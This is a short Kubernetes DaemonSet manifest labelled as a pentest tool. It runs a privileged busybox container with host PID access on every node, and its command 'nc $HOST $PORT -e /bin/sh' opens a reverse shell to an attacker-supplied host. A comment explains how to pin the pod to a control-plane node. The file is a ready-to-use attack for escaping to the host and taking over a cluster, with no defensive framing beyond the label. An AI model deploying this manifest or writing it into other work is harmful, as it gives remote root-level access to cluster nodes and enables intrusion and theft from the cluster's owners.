apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: priv-and-hostpid-revshell-deamonset
  labels:
    app: pentest
    type: deamonset
spec:
  selector:
    matchLabels:
      app: pentest
      type: deamonset
  template:
    metadata:
      labels:
        app: pentest
        type: deamonset
    spec:
      hostPID: true
      containers:
      - name: priv-and-hostpid-revshell-deamonset
        image: busybox
        securityContext:
          privileged: true
        command: [ "/bin/sh", "-c", "--" ]
        args: [ "nc $HOST $PORT  -e /bin/sh;" ]
      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name